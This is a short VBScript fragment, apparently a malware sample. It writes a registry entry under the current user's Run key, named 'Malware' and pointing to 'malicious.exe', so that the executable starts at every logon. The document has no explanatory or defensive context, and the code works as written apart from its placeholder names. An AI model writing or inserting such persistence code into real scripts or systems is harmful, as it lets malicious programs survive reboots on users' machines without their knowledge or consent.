Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Malware", "malicious.exe"